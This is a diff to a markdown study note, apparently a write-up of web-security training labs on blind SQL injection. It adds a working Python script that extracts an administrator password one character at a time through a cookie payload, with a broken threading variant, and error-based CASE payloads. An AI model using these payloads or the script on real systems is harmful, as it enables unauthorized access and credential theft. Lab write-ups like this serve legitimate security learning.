@@ -320,3 +320,71 @@ Eventually, we send the following input, which returns the "Welcome back" messag
 `xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's`
 
 We can continue this process to systematically determine the full password for the Administrator user. 
+
+### Lab: Blind SQL injection with conditional responses
+
+To solve the lab, log in as the administrator user. 
+
+For this challenge, I used the following script:
+```python
+import requests
+import string
+import time
+
+url = "https://0acb00b604553375807430a400680000.web-security-academy.net/filter?category=Gifts"
+chars = string.ascii_letters + string.digits + "!@#$%^&*()_+-=[]{}|;:,.<>?/\\"
+password = ""
+def test(payload):
+    cookies = {
+        "TrackingId": f"dDGeQctwLW3eyP9C{payload}",
+        "session": "dbtW13tCC5ST8tR1zaUFc9B82NM0JRuP",
+    }
+    response = requests.get(url, cookies=cookies)
+    print(response.status_code)
+    return "Welcome" in response.text
+for pos in range(1, 30):
+    for char in chars:
+        #time.sleep(0.1)
+        payload = f"' AND (SELECT SUBSTRING(password,{pos},1) FROM users WHERE username='administrator') = '{char}'--"
+        if test(payload):
+            password += char
+            print(password)
+```
+
+Consider a optimization by adding this:
+```python
+def find(pos):
+    with ThreadPoolExecutor(max_workers=10) as executor: 
+        futures = {executor.submit(test, pos, char): char for char in chars}
+        for future in futures:
+            result = future.result()
+            if result:
+                return result
+    return None
+```
+![alt text](image-6.png)
+
+## Error-based SQL injection
+
+### Exploiting blind SQL injection by triggering conditional errors
+
+To see how this works, suppose that two requests are sent containing the following **TrackingId** cookie values in turn:
+
+`xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a`
+
+`xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a`
+
+These inputs use the **CASE** keyword to test a condition and return a different expression depending on whether the expression is true:
+
+ -   With the first input, the **CASE** expression evaluates to 'a', which does not cause any error.
+ -   With the second input, it evaluates to **1/0**, which causes a divide-by-zero error.
+
+If the error causes a difference in the application's HTTP response, you can use this to determine whether the injected condition is true.
+
+Using this technique, you can retrieve data by testing one character at a time:
+
+`xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a`
+
+### Lab: Blind SQL injection with conditional errors
+
+To solve the lab, log in as the administrator user. 
